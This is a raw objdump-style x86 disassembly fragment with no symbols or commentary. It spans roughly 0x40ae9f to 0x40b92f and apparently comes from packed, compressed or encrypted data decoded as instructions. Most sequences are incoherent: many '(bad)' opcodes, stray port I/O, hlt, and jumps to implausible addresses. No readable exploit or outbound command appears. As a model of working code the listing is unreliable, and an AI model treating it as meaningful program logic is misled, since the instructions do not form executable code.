  40ae9f:	lds    eax,FWORD PTR [edi-0x58]
  40aea2:	cmp    eax,0x8ea11d03
  40aea7:	hlt    
  40aea8:	mov    BYTE PTR [ebp+eiz*2-0x14],ah
  40aeac:	(bad)  
  40aead:	(bad)  
  40aeae:	ret    0xe3b6
  40aeb1:	(bad)  
  40aeb2:	mov    ?,esp
  40aeb4:	push   ebp
  40aeb6:	rcl    eax,0xff
  40aeb9:	call   0xc5fd86fb
  40aebe:	data16 hlt 
  40aec0:	(bad)  
  40aec1:	jmp    0xe9ce8e04
	...
  40aeee:	add    BYTE PTR [eax],al
  40aef0:	cmp    eax,0x955c835b
  40aef5:	in     al,dx
  40aef6:	(bad)  
  40aef7:	xchg   esi,eax
  40aef8:	cmp    eax,0x3d688464
  40aefd:	pop    ebx
  40aefe:	add    BYTE PTR [eax],al
  40af00:	das    
  40af01:	out    dx,eax
  40af02:	(bad)  
  40af03:	out    dx,al
  40af04:	adc    DWORD PTR [ebx+0x24bf0875],ecx
  40af0a:	mov    al,0xff
  40af0c:	push   eax
  40af0d:	mov    esi,DWORD PTR [ebp-0x74e714]
  40af13:	dec    DWORD PTR [edx-0x392f1910]
  40af19:	mov    edi,edi
  40af1b:	dec    edx
  40af1d:	nop
  40af1e:	idiv   edi
  40af20:	add    BYTE PTR [ebx-0x6210f78b],cl
  40af26:	mov    cl,0xff
  40af28:	push   eax
  40af29:	mov    esi,DWORD PTR [ebp-0x74b71c]
  40af2f:	(bad)  
  40af30:	(bad)  
  40af32:	out    0xb4,al
  40af34:	push   ss
  40af35:	mov    edi,edi
  40af37:	dec    DWORD PTR [edx]
  40af39:	inc    esp
  40af3a:	idiv   edi
  40af3c:	xor    BYTE PTR [ebx+0x1c2f0875],cl
  40af42:	mov    al,0xff
  40af44:	push   eax
  40af45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af46:	mov    ch,0xe0
  40af48:	dec    eax
  40af49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af4a:	(bad)  
  40af4b:	dec    edx
  40af4d:	out    dx,eax
  40af4e:	out    0x98,al
  40af50:	(bad)  
  40af51:	mov    ds:0x83ff,eax
	...
  40af7e:	rol    BYTE PTR [esi-0x9],cl
  40af81:	call   DWORD PTR [eax]
  40af83:	pop    edi
  40af84:	je     0x40afa1
  40af86:	xchg   esp,eax
  40af87:	retf   0xf7cf
  40af8a:	add    BYTE PTR [esp+eax*1-0x7a8f0a8b],ah
  40af91:	fmul   st,st(0)
  40af93:	mov    ds:0xa507ffff,eax
  40af98:	jne    0x40afa2
  40af9a:	iret   
  40af9b:	repnz scas eax,DWORD PTR es:[edi]
  40af9d:	call   eax
  40af9f:	(bad)
  40afa3:	add    cl,BYTE PTR [esi+0x75]
  40afa6:	ss (bad) 
  40afa9:	mov    al,0xd9
  40afab:	fmul   QWORD PTR [esi-0x4b]
  40afae:	fisubr DWORD PTR [edi+ecx*2-0x1]
  40afb2:	(bad)  
  40afb3:	cmp    eax,0x84c1ff98
  40afb8:	cdq    
  40afb9:	in     al,dx
  40afba:	mov    cl,0x7c
  40afbc:	dec    edi
  40afbd:	call   0xff8f7dc1
  40afc2:	test   eax,0xa1f75bd6
  40afc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afc8:	pop    esp
  40afc9:	rcr    BYTE PTR ss:[edi+ecx*2+0x57a1cbff],cl
  40afd1:	dec    DWORD PTR [ecx-0x7e4be467]
  40afd7:	inc    esp
  40afd8:	dec    edi
  40afd9:	mov    ch,0x96
  40afdb:	push   esp
  40afdc:	dec    edi
  40afdd:	jmp    DWORD PTR [esi+0x21]
  40afe0:	xchg   edi,eax
  40afe1:	inc    DWORD PTR [eax]
	...
  40b00b:	add    BYTE PTR [ecx+0x4c],ch
  40b00e:	cdq    
  40b00f:	lock imul esp,DWORD PTR [edi+ecx*2-0x18],0xff4f3633
  40b018:	push   ecx
  40b019:	mov    esi,0xee73e94a
  40b01e:	dec    ebp
  40b01f:	inc    DWORD PTR [ecx+0x6e]
  40b022:	dec    edi
  40b023:	call   0x439497
  40b028:	pop    es
  40b029:	(bad)  
  40b02a:	cli    
  40b02b:	call   DWORD PTR [edx-0x57ca083]
  40b031:	and    cl,bl
  40b033:	jmp    DWORD PTR [edi+0x46754de7]
  40b039:	or     al,0x26
  40b03b:	mov    cl,0x9
  40b03d:	stos   BYTE PTR es:[edi],al
  40b03e:	jnp    0x40b085
  40b040:	add    bl,BYTE PTR [ebp+0x5b7f575f]
  40b046:	jmp    0x91a41b99
  40b04b:	shr    dl,1
  40b04d:	repnz xchg ebp,eax
  40b04f:	dec    esi
  40b050:	imul   ebp,edi,0xffffff8d
  40b053:	fadd   DWORD PTR [ecx+0x3]
  40b056:	sbb    edx,DWORD PTR [ebp+0x41aff2d1]
  40b05c:	inc    edx
  40b05d:	pop    ebx
  40b05e:	sbb    al,0x7b
  40b060:	rcr    ah,cl
  40b062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b063:	aas    
  40b064:	mov    cl,0xf2
  40b066:	gs cmp bl,0xee
  40b06a:	mov    eax,0x565f334e
  40b06f:	sbb    BYTE PTR [eax],al
	...
  40b099:	add    al,dl
  40b09b:	mov    ds:0xfaa603a8,eax
  40b0a0:	add    edi,DWORD PTR gs:[esi]
  40b0a3:	sub    si,di
  40b0a6:	ret    0xeb92
  40b0a9:	add    edi,DWORD PTR [esi]
  40b0ab:	sbb    ah,BYTE PTR [ebx+ecx*2+0x3e95b3e]
  40b0b2:	jns    0x40b04c
  40b0b4:	adc    eax,0xe95b414e
  40b0b9:	fldenv [ecx-0x7c]
  40b0bc:	jmp    0xe9c50a9a
  40b0c1:	cmp    bl,0xe6
  40b0c4:	cwde   
  40b0c5:	add    bl,0xe7
  40b0c8:	std    
  40b0c9:	dec    ebp
  40b0ca:	inc    ecx
  40b0cb:	mov    ebp,esi
  40b0cd:	xlat   BYTE PTR ds:[ebx]
  40b0ce:	xor    edx,esi
  40b0d0:	pop    ebx
  40b0d1:	push   eax
  40b0d2:	es mov ah,0x7d
  40b0d5:	add    al,0x3e
  40b0d7:	test   ax,0x3ad8
  40b0db:	add    al,0xb
  40b0dd:	add    bh,BYTE PTR [esi]
  40b0df:	pop    ebx
  40b0e0:	push   ecx
  40b0e1:	jp     0x40b069
  40b0e3:	pushf  
  40b0e4:	jmp    0xa04435
  40b0e9:	rol    DWORD PTR [ecx+ebp*4],0xfe
  40b0ed:	scas   al,BYTE PTR es:[edi]
  40b0ee:	ja     0x40b0fb
  40b0f0:	lea    ebp,[esi+edx*4-0x16]
  40b0f4:	(bad)  
  40b0f5:	sahf   
  40b0f6:	mov    dl,0x8b
  40b0f8:	call   0xff327c23
  40b0fd:	pusha  
	...
  40b126:	add    BYTE PTR [eax],al
  40b128:	shr    edx,0xf6
  40b12b:	xchg   BYTE PTR [ebx+0x73ad84e0],al
  40b131:	repnz (bad) 
  40b133:	sbb    edx,esp
  40b135:	mov    eax,0xf2422857
  40b13a:	mov    ah,0x59
  40b13c:	or     esi,edx
  40b13e:	(bad)  
  40b13f:	pop    esi
  40b140:	push   ecx
  40b141:	rol    DWORD PTR [edi-0x58],0x3d
  40b145:	add    edx,DWORD PTR [ecx-0x69]
  40b148:	or     esi,edx
  40b14a:	mov    BYTE PTR [esi+eiz*1-0x16],ch
  40b14e:	(bad)  
  40b14f:	ds fs icebp 
  40b152:	data16 je 0x40b127
  40b155:	call   0x26f6:0xead12e00
  40b15c:	add    esi,edx
  40b15e:	xor    al,0x4f
  40b160:	stos   BYTE PTR es:[edi],al
  40b161:	call   0xefe:0xa94f0100
  40b168:	aad    0xd7
  40b16a:	jmp    0x40b16a
  40b16c:	add    dh,dl
  40b16e:	imul   ebp,ecx,0xa8581b65
  40b174:	cmp    eax,0x92f9b4f2
  40b179:	lock (bad) 
  40b17b:	out    0x48,al
  40b17d:	rol    DWORD PTR [edi+0x28],0x42
  40b181:	add    edx,DWORD PTR ds:0x88f0729f
  40b187:	fs jne 0x40b172
  40b18a:	inc    BYTE PTR [eax]
	...
  40b1b4:	add    BYTE PTR [eax],al
  40b1b6:	clc    
  40b1b7:	adc    bh,bh
  40b1b9:	addr16 fcmovb st,st(4)
  40b1bc:	aas    
  40b1bd:	add    al,cl
  40b1bf:	leave  
  40b1c0:	out    dx,eax
  40b1c1:	imul   DWORD PTR [eax-0x76ca0061]
  40b1c7:	mov    ah,0x3f
  40b1c9:	add    bh,cl
  40b1cb:	xchg   DWORD PTR [ebp-0x7a8a3701],esi
  40b1d1:	loopne 0x40b183
  40b1d3:	lahf   
  40b1d4:	dec    DWORD PTR [ebp-0x8bb9e]
  40b1da:	dec    eax
  40b1db:	lods   al,BYTE PTR ds:[esi]
  40b1dc:	enterw 0x1c2f,0xff
  40b1e1:	(bad)  
  40b1e2:	jb     0x40b170
  40b1e4:	idiv   edi
  40b1e6:	sbb    BYTE PTR [edi+0x1defae35],bl
  40b1ec:	jmp    edi
  40b1ee:	arpl   cx,cx
  40b1f0:	(bad)  
  40b1f1:	call   FWORD PTR [esp+ebx*4-0x1edbec8c]
  40b1f8:	xlat   BYTE PTR ds:[ebx]
  40b1f9:	test   DWORD PTR [eax-0x61],0x9f9d7504
  40b200:	xor    BYTE PTR [edi-0x8c01e],cl
  40b206:	sbb    BYTE PTR [ebx+0x3fe2c70a],dl
  40b20c:	idiv   edi
  40b20e:	dec    eax
  40b20f:	jmp    0xaca8b212
  40b214:	out    0x95,al
  40b216:	adc    eax,0x8dff9f
	...
  40b243:	add    dl,ah
  40b245:	sub    esi,edi
  40b247:	dec    DWORD PTR [eax-0x53]
  40b24a:	data16 mov al,0xcf
  40b24d:	sbb    al,0xff
  40b24f:	(bad)  
  40b250:	rol    BYTE PTR [esi-0x5bf70009],cl
  40b256:	xor    eax,0xc53a3eae
  40b25b:	jmp    DWORD PTR [ecx]
  40b25d:	jb     0x40b1f0
  40b25f:	call   DWORD PTR [ecx]
  40b261:	in     eax,dx
  40b262:	inc    edx
  40b263:	je     0x40b292
  40b265:	test   DWORD PTR [ecx+0x4aa909d0],ecx
  40b26b:	add    al,0x73
  40b26d:	cld    
  40b26e:	dec    ecx
  40b26f:	xor    cl,al
  40b271:	jle    0x40b2a3
  40b273:	imul   ecx
  40b275:	rcr    BYTE PTR [esi+0xa],1
  40b278:	stc    
  40b279:	jle    0x40b2ab
  40b27b:	neg    ecx
  40b27d:	loopne 0x40b282
  40b27f:	add    BYTE PTR [esi],bh
  40b281:	add    dh,BYTE PTR [ebx+0x4b346fe7]
  40b287:	(bad)  
  40b288:	mov    ebp,0xb9f76026
  40b28d:	add    BYTE PTR [esp+esi*2],0x71
  40b291:	test   DWORD PTR [ecx+0x4b90b1d4],ecx
  40b297:	add    ch,BYTE PTR [ebx]
  40b299:	push   eax
  40b29a:	fdivp  st(7),st
  40b29c:	retf   0x3876
  40b29f:	not    DWORD PTR [ecx-0x2c014b68]
  40b2a5:	xchg   ebp,eax
  40b2a6:	push   ebx
  40b2a7:	inc    DWORD PTR [eax]
	...
  40b2d1:	add    BYTE PTR [ecx+0x79db9c99],al
  40b2d7:	inc    eax
  40b2d8:	(bad)  
  40b2d9:	mov    edi,0xbd85eaea
  40b2de:	jp     0x40b328
  40b2e0:	dec    ebx
  40b2e1:	(bad)  
  40b2e2:	ds iret 
  40b2e4:	out    dx,eax
  40b2e5:	(bad)  
  40b2e6:	xchg   ebx,eax
  40b2e7:	push   ebp
  40b2e8:	push   ebx
  40b2e9:	call   DWORD PTR [ecx+0x49]
  40b2ec:	div    DWORD PTR [ecx-0x7abe0fb7]
  40b2f2:	pop    edx
  40b2f3:	lock dec ecx
  40b2f5:	(bad)  
  40b2f6:	ds add al,0x3
  40b2f9:	add    BYTE PTR [ebp+0x315fa45b],bh
  40b2ff:	out    dx,eax
  40b300:	fld    QWORD PTR [ebx]
  40b302:	stos   BYTE PTR es:[edi],al
  40b303:	sub    BYTE PTR [edx-0x78],0x2a
  40b307:	out    0xcd,eax
  40b309:	dec    edx
  40b30a:	ds addr16 dec ebx
  40b30d:	xchg   ebx,ecx
  40b30f:	add    esi,DWORD PTR [esi+0x3d5c014a]
  40b315:	lods   eax,DWORD PTR ds:[esi]
  40b316:	popa   
  40b317:	pop    ecx
  40b318:	jmp    0x1c2f6377
  40b31d:	cld    
  40b31e:	loope  0x40b2e9
  40b320:	dec    esi
  40b321:	dec    edx
  40b322:	loope  0x40b312
  40b324:	pop    ebx
  40b325:	push   edi
  40b326:	shr    esi,1
  40b328:	lea    ecx,[edx+0x4b]
  40b32b:	arpl   WORD PTR [ecx+0x7dee9861],dx
  40b331:	dec    edx
  40b332:	mov    eax,DWORD PTR [ebx]
  40b334:	jle    0x40b380
	...
  40b35e:	add    BYTE PTR [eax],al
  40b360:	mov    ecx,0x99fbf3ee
  40b365:	adc    edx,DWORD PTR [edi-0x6c1156b6]
  40b36b:	aaa    
  40b36c:	test   eax,0xd34a55ee
  40b371:	not    DWORD PTR [ebp+0x4a]
  40b374:	xchg   ecx,eax
  40b375:	out    dx,al
  40b376:	mov    ebx,0x8ed3a1fb
  40b37b:	dec    edx
  40b37c:	sub    esi,0xee71277b
  40b382:	sub    eax,0x1162eb4a
  40b387:	scas   eax,DWORD PTR es:[edi]
  40b388:	fwait
  40b389:	out    dx,al
  40b38a:	sbb    eax,0x1dfbab4a
  40b38f:	dec    edx
  40b390:	pop    ecx
  40b391:	out    dx,al
  40b392:	xchg   ebx,eax
  40b393:	sti    
  40b394:	pop    ecx
  40b395:	ret    
  40b396:	push   esi
  40b397:	dec    edx
  40b398:	dec    ecx
  40b399:	out    dx,al
  40b39a:	xor    ebx,DWORD PTR [edi+0x49]
  40b39d:	out    dx,al
  40b39e:	push   ebp
  40b3a0:	xchg   esp,eax
  40b3a1:	loope  0x40b353
  40b3a3:	out    dx,al
  40b3a4:	xchg   esi,ebp
  40b3a6:	mov    ah,0xd5
  40b3a8:	(bad)  
  40b3a9:	out    dx,al
  40b3aa:	(bad)  
  40b3ab:	shl    edi,1
  40b3ad:	stos   BYTE PTR es:[edi],al
  40b3ae:	(bad)  
  40b3af:	(bad)  
  40b3b0:	xchg   DWORD PTR [eax-0x11782919],ebp
  40b3b6:	out    0x3d,eax
  40b3b8:	lods   eax,DWORD PTR ds:[esi]
  40b3b9:	in     eax,dx
  40b3ba:	(bad)  
  40b3bb:	mov    esi,0xb6f6fab1
  40b3c0:	xchg   DWORD PTR [ebx],eax
  40b3c2:	imul   edi,DWORD PTR [eax+0x0],0x0
	...
  40b3ed:	add    BYTE PTR [edi-0x6da30112],al
  40b3f3:	out    0xfe,al
  40b3f5:	sahf   
  40b3f6:	or     BYTE PTR [ebp-0x1178694f],0x44
  40b3fd:	xchg   ecx,eax
  40b3fe:	jne    0x40b3ab
  40b400:	cld    
  40b401:	xchg   BYTE PTR [edi-0x12],dh
  40b404:	je     0x40b483
  40b406:	bound  esi,QWORD PTR [ecx-0x63]
  40b409:	jmp    0xe202d84b
  40b40e:	cmp    eax,0xc3558b88
  40b413:	push   ss
  40b414:	hlt    
  40b415:	sar    DWORD PTR ds:0x89560e81,cl
  40b41b:	push   ebp
  40b41c:	call   0xff2e6bfa
  40b421:	jo     0x40b3ec
  40b423:	icebp  
  40b424:	addr16 jmp 0xc1feb267
  40b42a:	push   esp
  40b42b:	xchg   ebx,eax
  40b42c:	inc    ecx
  40b42d:	jmp    0xa898dbc7
  40b432:	cmp    eax,0x5f174ee
  40b437:	xchg   edx,eax
  40b438:	ficom  DWORD PTR [esi]
  40b43a:	pop    es
  40b43b:	loopne 0x40b481
  40b43d:	adc    DWORD PTR [edx-0x60ff7f8b],ecx
  40b443:	sbb    bh,bh
  40b445:	addr16 fwait
  40b447:	sar    DWORD PTR [edi],0x0
  40b44a:	xor    BYTE PTR [esi-0x52],bl
  40b44d:	dec    eax
  40b44e:	out    0x58,al
  40b450:	call   0x40b472
	...
  40b479:	add    BYTE PTR [eax],al
  40b47b:	add    bl,cl
  40b47d:	mov    ds:0x1cd70bff,eax
  40b482:	and    eax,0x688b6a89
  40b487:	add    DWORD PTR [edi],esp
  40b489:	xchg   esp,eax
  40b48a:	mov    esi,0xe6ef4aff
  40b48f:	mov    ds:0xffffa3b2,al
  40b494:	cmp    bl,BYTE PTR [edi-0x5c548a01]
  40b49a:	jne    0x40b4a4
  40b49c:	iret   
  40b49d:	lods   eax,DWORD PTR cs:[esi]
  40b49f:	inc    eax
  40b4a1:	mov    ds:0x3fbff475,eax
  40b4a6:	mov    al,0xff
  40b4a8:	rcl    BYTE PTR [eax],0x87
  40b4ab:	pop    eax
  40b4ac:	push   ss
  40b4ad:	push   edi
  40b4ae:	push   DWORD PTR [ebp-0x31]
  40b4b1:	nop
  40b4b2:	(bad)  
  40b4b3:	cld    
  40b4b4:	xor    BYTE PTR [ebx-0x5cdc8a01],ah
  40b4ba:	jne    0x40b4c4
  40b4bc:	nop    DWORD PTR [ebp-0x3dceff01]
  40b4c3:	add    al,0xa7
  40b4c5:	mov    ebp,0x2c24ec89
  40b4ca:	cld    
  40b4cb:	push   0xffffff97
  40b4cd:	push   cs
  40b4ce:	push   cs
  40b4cf:	dec    edx
  40b4d1:	lock out 0xe5,al
  40b4d4:	ret    0xffa3
  40b4d7:	mov    DWORD PTR [edx+0x57006894],ebx
  40b4dd:	xchg   ebx,eax
  40b4de:	mov    esi,0x68
	...
  40b507:	add    BYTE PTR [eax],al
  40b509:	add    dh,bh
  40b50b:	mov    edi,0xda3e003f
  40b510:	pop    ebp
  40b511:	pop    eax
  40b512:	inc    DWORD PTR [ecx]
  40b514:	dec    eax
  40b515:	jne    0x40b54d
  40b517:	dec    edx
  40b518:	xor    ebx,ecx
  40b51a:	inc    ecx
  40b51b:	in     eax,dx
  40b51c:	inc    esi
  40b51d:	jne    0x40b559
  40b51f:	in     eax,0xcc
  40b521:	pop    es
  40b522:	es hlt 
  40b524:	cwde   
  40b525:	jmp    FWORD PTR [ecx]
  40b527:	stos   DWORD PTR es:[edi],eax
  40b528:	inc    ecx
  40b529:	add    al,0x3e
  40b52b:	daa    
  40b52c:	jnp    0x40b51a
  40b52e:	mov    ebp,0x3e6a47bd
  40b533:	cwde   
  40b534:	hlt    
  40b535:	(bad)  
  40b536:	xchg   ebx,eax
  40b537:	jmp    0x8946:0xacd3aa5a
  40b53e:	and    DWORD PTR [esi-0x530e0025],0xffffff85
  40b545:	push   0xffc599d9
  40b54a:	pop    ecx
  40b54b:	(bad)  
  40b54c:	stos   DWORD PTR es:[edi],eax
  40b54d:	inc    eax
  40b54e:	(bad)
  40b552:	out    0x66,al
  40b554:	sub    eax,0x447c9ff
  40b559:	push   0xffc53b0f
  40b55e:	and    DWORD PTR ds:0x7d3e40ac,ecx
  40b564:	adc    DWORD PTR [esi-0x17fd3d0a],ebp
  40b56a:	pop    es
  40b56b:	rol    DWORD PTR [esi-0x1],1
	...
  40b596:	add    BYTE PTR [eax],al
  40b598:	inc    ebp
  40b599:	inc    edx
  40b59a:	shl    BYTE PTR [ebx],1
  40b59c:	shrd   DWORD PTR es:[eax+0x3e],eax,0xd2
  40b5a2:	pop    edx
  40b5a3:	and    eax,0x50472cca
  40b5a8:	out    0x1,al
  40b5aa:	add    ebp,edi
  40b5ac:	mov    al,0x19
  40b5ae:	push   esi
  40b5af:	pop    eax
  40b5b0:	call   FWORD PTR [edx-0x17]
  40b5b3:	mov    bl,0x60
  40b5b5:	gs icebp 
  40b5b7:	pop    ebx
  40b5b8:	adc    dl,BYTE PTR cs:[esi]
  40b5bb:	inc    edi
  40b5bc:	push   cx
  40b5be:	pop    ecx
  40b5bf:	inc    edi
  40b5c0:	dec    ecx
  40b5c1:	jmp    0x40b63e
  40b5c3:	inc    edi
  40b5c4:	inc    ecx
  40b5c5:	gs icebp 
  40b5c7:	pop    ebx
  40b5c8:	retf   0xf5b8
  40b5cb:	inc    esi
  40b5cc:	pop    es
  40b5cd:	push   ds
  40b5ce:	in     eax,0x3
  40b5d0:	xchg   ebx,eax
  40b5d1:	(bad)  
  40b5d2:	aam    0x82
  40b5d4:	cli    
  40b5d5:	out    0x36,eax
  40b5d7:	scas   eax,DWORD PTR es:[edi]
  40b5d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5d9:	pop    ebx
  40b5da:	inc    ebx
  40b5db:	cmc    
  40b5dc:	adc    BYTE PTR [ecx-0x1f],dh
  40b5df:	pop    ebx
  40b5e0:	pop    eax
  40b5e1:	mov    eax,0xa0b746c5
  40b5e6:	mov    ebp,0x212d337a
  40b5eb:	vpmullw xmm5,xmm1,xmm3
  40b5ef:	or     eax,0x83e99c76
  40b5f4:	and    DWORD PTR [ebx+0x15],ebx
  40b5f7:	mov    ebx,0xc5302861
	...
  40b624:	add    BYTE PTR [eax],al
  40b626:	rcl    DWORD PTR [ecx+0x5ba5ba81],1
  40b62c:	jmp    0xc4b0382b
  40b631:	lods   eax,DWORD PTR ds:[esi]
  40b632:	mov    eax,ds:0xb1462fca
  40b637:	jae    0x40b660
  40b639:	lods   eax,DWORD PTR ds:[esi]
  40b63a:	(bad)  
  40b63b:	pop    edx
  40b63c:	mov    ecx,0x5daeeb5b
  40b641:	inc    esi
  40b642:	out    dx,al
  40b643:	jb     0x40b62e
  40b645:	add    esp,DWORD PTR [ecx+0x1346b8a9]
  40b64b:	push   ebx
  40b64c:	push   ecx
  40b64d:	inc    ebx
  40b64e:	imul   ebp,edx,0x3d
  40b651:	pop    ebx
  40b652:	test   al,0xba
  40b654:	push   DWORD PTR ds:0xa700f5f8
  40b65a:	mov    ebp,0xf79c0029
  40b65f:	mov    al,ds:0xa3fddafc
  40b664:	(bad)  
  40b665:	push   ss
  40b666:	clc    
  40b667:	jmp    0x6275f65d
  40b66c:	jne    0x40b6aa
  40b66e:	clc    
  40b66f:	outs   dx,DWORD PTR ds:[esi]
  40b670:	cld    
  40b671:	dec    BYTE PTR [ecx]
  40b673:	(bad)  
  40b674:	call   0xff2a8d5c
  40b679:	mov    fs,ebx
  40b67b:	adc    al,dl
  40b67d:	in     eax,dx
  40b67e:	cmp    eax,0xbfcd8b90
  40b683:	push   ds
  40b684:	cld    
  40b685:	inc    ebx
  40b686:	cmp    dh,BYTE PTR [ebp+0x12]
  40b689:	into   
	...
  40b6b2:	add    BYTE PTR [eax],al
  40b6b4:	stc    
  40b6b5:	popa   
  40b6b6:	call   0xff2a5d50
  40b6bb:	jo     0x40b676
  40b6bd:	in     eax,0x67
  40b6bf:	jmp    0x41feb101
  40b6c4:	xchg   esp,eax
  40b6c5:	add    BYTE PTR [ecx-0x17],0x5
  40b6c9:	mov    ebx,DWORD PTR [ecx+0x28]
  40b6cc:	inc    edx
  40b6cd:	jmp    0x8ed7:0xd275e174
  40b6d4:	sub    edx,0x74
  40b6d7:	test   DWORD PTR [ebx+0x70],edi
  40b6da:	or     BYTE PTR [ecx+0x76feb771],dl
  40b6e0:	jne    0x40b6ff
  40b6e2:	add    al,0xe9
  40b6e4:	fcom   st(4)
  40b6e6:	jmp    0x40b750
  40b6e8:	inc    BYTE PTR [esi]
  40b6ea:	neg    DWORD PTR [esi+0x3]
  40b6ed:	fadd   DWORD PTR [ebp+edx*2-0x36]
  40b6f1:	call   0x3043946a
  40b6f6:	scas   al,BYTE PTR es:[edi]
  40b6f7:	add    bh,cl
  40b6f9:	sbb    al,0xff
  40b6fb:	out    0x85,eax
  40b6fd:	jb     0x40b6ff
  40b6ff:	add    BYTE PTR [ebp+ebx*4+0xf],bl
  40b703:	test   DWORD PTR [esi+0x1000005d],esi
  40b709:	stos   BYTE PTR es:[edi],al
  40b70a:	test   BYTE PTR [eax],0x67
  40b70d:	pop    ebp
  40b70e:	add    bh,al
  40b710:	mov    ds:0x5707ff99,al
  40b715:	pop    ebp
  40b716:	push   0x0
	...
  40b740:	add    BYTE PTR [eax],al
  40b742:	lods   eax,DWORD PTR ds:[esi]
  40b743:	pop    ebp
  40b744:	push   0x0
  40b746:	int    0x5c
  40b748:	lea    eax,[ebp+0x33]
  40b74b:	lods   eax,DWORD PTR ds:[esi]
  40b74c:	mov    eax,DWORD PTR [ebp-0x67cd]
  40b752:	addr16 sahf 
  40b754:	jne    0x40b74e
  40b756:	clc    
  40b757:	sbb    ebx,edi
  40b759:	call   0x412991
  40b75e:	sbb    al,0x9d
  40b760:	je     0x40b767
  40b762:	out    dx,al
  40b763:	or     BYTE PTR [eax],al
  40b765:	add    bh,ah
  40b767:	add    al,0x89
  40b769:	dec    eax
  40b76a:	es pop edi
  40b76c:	push   DWORD PTR [ebp+0xb]
  40b76f:	test   DWORD PTR [ebp+0x509f98b2],eax
  40b775:	mov    edx,DWORD PTR [edi-0x4f0b7a8f]
  40b77b:	lahf   
  40b77c:	call   DWORD PTR [eax+0x5]
  40b77f:	xchg   DWORD PTR [ebp-0x4e],esi
  40b782:	mov    eax,0x3785899f
  40b787:	xchg   edi,eax
  40b788:	(bad)  
  40b789:	(bad)  
  40b78a:	mov    edi,0x18ffae23
  40b78f:	add    bh,bh
  40b791:	xor    BYTE PTR [di+0x3f],0xf8
  40b797:	fsubr  st,st(7)
  40b799:	idiv   DWORD PTR [esi]
  40b79b:	xchg   ecx,eax
  40b79c:	inc    esp
  40b79d:	call   DWORD PTR [ebx+0x68]
  40b7a0:	mov    ebx,0x388a3e40
  40b7a5:	mov    cl,0x0
	...
  40b7cf:	add    BYTE PTR [ecx+0x29],bh
  40b7d2:	jp     0x40b759
  40b7d4:	pop    edx
  40b7d5:	sub    DWORD PTR [edi+edi*8-0x2c],eax
  40b7d9:	icebp  
  40b7da:	fisub  DWORD PTR [esi+0x7]
  40b7dd:	mov    bl,0x2
  40b7df:	call   DWORD PTR [ebx+0x51ff4c42]
  40b7e5:	push   ecx
  40b7e6:	push   cs
  40b7e7:	scas   al,BYTE PTR es:[edi]
  40b7e8:	div    BYTE PTR [edx+0x2393e802]
  40b7ee:	inc    esp
  40b7ef:	inc    edi
  40b7f1:	jle    0x40b84a
  40b7f3:	div    DWORD PTR [ecx]
  40b7f5:	icebp  
  40b7f6:	xlat   BYTE PTR ds:[ebx]
  40b7f7:	jmp    DWORD PTR [ecx+0x3e40aa68]
  40b7fd:	add    DWORD PTR [ecx-0x10],edi
  40b800:	adc    DWORD PTR [ecx],ecx
  40b802:	inc    ebx
  40b803:	dec    DWORD PTR [ebx-0x20]
  40b806:	retf   
  40b807:	inc    eax
  40b808:	sbb    dl,BYTE PTR ds:[ebx-0x72defe4f]
  40b80f:	test   esi,esp
  40b811:	mov    al,0x42
  40b813:	inc    ebx
  40b815:	jbe    0x40b877
  40b817:	imul   ecx
  40b819:	mov    eax,0x9abe67d3
  40b81e:	(bad)  
  40b821:	mov    ?,WORD PTR [edi+esi*8]
  40b824:	rcl    eax,1
  40b826:	inc    edx
  40b827:	xor    eax,0xffc53998
  40b82c:	(bad)  [ebp+0x75]
  40b82f:	(bad)  
  40b830:	mov    ecx,0x7442ec
	...
  40b85d:	add    BYTE PTR [edi+0x75],dl
  40b860:	sbb    esp,0x44378b1
  40b866:	sub    ebx,DWORD PTR [ebx-0x7]
  40b869:	inc    edx
  40b86a:	dec    esi
  40b86b:	fsub   DWORD PTR [ebx+0x24]
  40b86e:	mov    edi,esp
  40b870:	push   ebp
  40b871:	aam    0xa1
  40b873:	and    DWORD PTR [edi+0x43],edi
  40b876:	xor    ebx,0x6e7e0edc
  40b87c:	out    0xd3,eax
  40b87e:	pop    ecx
  40b87f:	xor    eax,0x1f694387
  40b884:	fs and al,0x69
  40b887:	out    0x25,eax
  40b889:	sbb    DWORD PTR [esi],edi
  40b88b:	pop    ebx
  40b88c:	jmp    0x1e3f4c17
  40b891:	inc    ebx
  40b892:	dec    ecx
  40b893:	pop    edx
  40b894:	xchg   ebp,eax
  40b895:	fidivr DWORD PTR [ebp+eiz*4-0x18c6c4ec]
  40b89c:	call   0x341b3c58
  40b8a1:	sub    al,0x31
  40b8a3:	out    0xed,eax
  40b8a5:	add    ebp,DWORD PTR [edx+0x3e0451a0]
  40b8ab:	neg    BYTE PTR [esi-0x3eac74be]
  40b8b1:	outs   dx,DWORD PTR ds:[esi]
  40b8b2:	aam    0xe6
  40b8b4:	int    0x42
  40b8b6:	retf   
  40b8b7:	idiv   DWORD PTR [ebp+0x33e6f942]
  40b8bd:	or     al,0xe6
  40b8bf:	pop    ebx
  40b8c0:	add    BYTE PTR [edx+0x0],0x0
	...
  40b8ec:	jmp    0xe96c2cd7
  40b8f1:	out    0xa5,al
  40b8f3:	inc    edx
  40b8f4:	push   ebx
  40b8f5:	push   ebx
  40b8f6:	xchg   ecx,eax
  40b8f7:	xor    eax,0x4295e6a4
  40b8fc:	xchg   ebx,eax
  40b8fd:	call   DWORD PTR [ebp-0x4193ebe]
  40b903:	or     esp,DWORD PTR [esi-0x4ebdad01]
  40b909:	out    0xff,al
  40b90b:	cmp    ebx,DWORD PTR [ebp-0x12]
  40b90e:	(bad)  
  40b90f:	outs   dx,BYTE PTR ds:[esi]
  40b910:	cld    
  40b911:	outs   dx,DWORD PTR ds:[esi]
  40b912:	or     BYTE PTR [ecx-0x2f],dl
  40b915:	mov    ah,0xfe
  40b917:	pop    esi
  40b918:	cld    
  40b919:	scas   eax,DWORD PTR es:[edi]
  40b91a:	jecxz  0x40b97a
  40b91c:	cld    
  40b91d:	in     eax,0xe7
  40b91f:	xchg   ecx,eax
  40b920:	push   cs
  40b921:	out    0xfe,al
  40b923:	inc    esi
  40b924:	div    dh
  40b926:	idiv   BYTE PTR [esi]
  40b928:	cld    
  40b929:	repnz lods al,BYTE PTR ds:[esi]
  40b92b:	test   ah,bh
  40b92d:	in     eax,0xfe
  40b92f:	je     0x40b946
